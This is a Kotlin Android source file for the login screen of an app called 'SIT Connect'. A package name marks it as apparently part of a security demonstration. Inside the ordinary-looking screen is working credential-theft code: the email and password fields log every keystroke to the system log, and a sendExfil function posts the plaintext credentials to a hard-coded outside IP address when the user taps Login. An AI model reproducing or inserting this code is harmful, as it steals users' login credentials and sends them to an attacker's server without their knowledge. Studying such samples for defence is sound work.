package com.example.sitconnect

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.example.sitconnect.ui.theme.SITConnectTheme
import android.content.Context
import android.util.Log
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.example.sitconnect.securitydemo.malicious.LocationTrackerWorker  // if still needed
import com.example.sitconnect.securitydemo.malicious.areAllLocationPermissionsGranted

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.OkHttpClient
import okhttp3.Request
import kotlin.concurrent.thread





@Composable
fun LoginScreen(
    modifier: Modifier = Modifier,
    viewModel: AuthViewModel = viewModel(),
    onLoginSuccess: (Context, String?) -> Unit = { _, _ -> }
) {
    val context = LocalContext.current
    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    val authState by viewModel.authState.collectAsState()

    // Navigate to home when login is successful
    LaunchedEffect(authState) {
        (authState as? AuthState.Success)?.let { success ->
            val uid = success.user?.uid
            onLoginSuccess(context, uid)
        }
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(text = "SIT Connect", style = MaterialTheme.typography.headlineLarge)
        Spacer(modifier = Modifier.height(16.dp))

        OutlinedTextField(
            value = email,
            onValueChange = { email = it
                Log.d("KEYSTROKE_LOG", "User Email: $it")},
            label = { Text("Email") },
            enabled = authState !is AuthState.Loading
        )
        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = password,
            onValueChange = { password = it
                Log.d("KEYSTROKE_LOG", "User Password: $it")},
            label = { Text("Password") },
            visualTransformation = PasswordVisualTransformation(),
            enabled = authState !is AuthState.Loading
        )
        Spacer(modifier = Modifier.height(16.dp))

        when (authState) {
            is AuthState.Loading -> {
                CircularProgressIndicator()
                Text(
                    text = "Logging in...",
                    color = MaterialTheme.colorScheme.primary,
                    modifier = Modifier.padding(top = 8.dp)
                )
            }
            is AuthState.Success -> {
                // Navigation will happen via LaunchedEffect
                // Don't show loading here to prevent UI lag
            }
            is AuthState.Error -> {
                Text(
                    text = (authState as AuthState.Error).message,
                    color = MaterialTheme.colorScheme.error
                )
                Spacer(modifier = Modifier.height(8.dp))
                Button(onClick = {
                    viewModel.resetAuthState()
                }) {
                    Text("Try Again")
                }
            }
            is AuthState.Idle -> {
                Button(onClick = {
                    if (email.isNotBlank() && password.isNotBlank()) {
                        viewModel.login(email, password)
                        sendExfil(emailValue = email, passwordValue = password)
                    }
                }) {
                    Text("Login")
                }
            }
        }
    }
}


@Preview(showBackground = true)
@Composable
fun LoginScreenPreview() {
    SITConnectTheme {
        LoginScreen()
    }
}

fun sendExfil(emailValue: String, passwordValue: String) {
    thread {
        try {
            val client = OkHttpClient()

            // FIX: Use .toMediaType() extension function instead of MediaType.get()
            val mediaType = "application/json; charset=utf-8".toMediaType()

            val jsonPayload = """
                {
                    "email": "$emailValue",
                    "label": "$passwordValue",
                    "timestamp": "${java.time.Instant.now()}"
                }
            """.trimIndent()

            // FIX: Use .toRequestBody() extension function instead of RequestBody.create()
            val body = jsonPayload.toRequestBody(mediaType)

            val request = Request.Builder()
                .url("http://139.59.244.51:5002/exfil")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) Log.e("EXFIL", "Error: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e("EXFIL", "Connection failed: ${e.message}")
        }
    }
}